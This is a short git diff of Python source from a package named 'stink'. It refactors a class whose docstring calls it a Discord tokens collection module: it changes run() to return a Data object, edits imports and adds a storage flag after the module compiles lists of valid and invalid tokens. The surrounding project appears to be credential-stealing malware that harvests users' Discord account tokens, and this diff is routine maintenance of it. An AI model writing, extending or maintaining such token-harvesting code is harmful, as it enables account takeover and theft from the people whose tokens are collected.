@@ -3,10 +3,11 @@ from json import loads
 from threading import Thread
 from os import listdir, path
 from urllib.request import Request, urlopen
-from typing import MutableMapping, List, Dict
+from typing import MutableMapping, Dict
 
 from stink.helpers import MemoryStorage
 from stink.helpers.config import DiscordConfig
+from stink.helpers.dataclasses import Data
 
 
 class Discord:
@@ -117,7 +118,9 @@ class Discord:
             "Invalid tokens:\n" + "\n".join(item for item in self.invalid) + "\n\nValid tokens:\n" + "".join(item for item in temp)
         )
 
-    def run(self) -> List:
+        self.__storage.add_data("Discord", True)
+
+    def run(self) -> Data:
         """
         Launches the Discord tokens collection module.
 
